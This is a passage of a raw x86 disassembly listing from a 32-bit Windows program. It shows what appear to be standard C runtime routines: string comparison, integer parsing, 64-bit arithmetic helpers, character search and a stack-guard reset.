  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
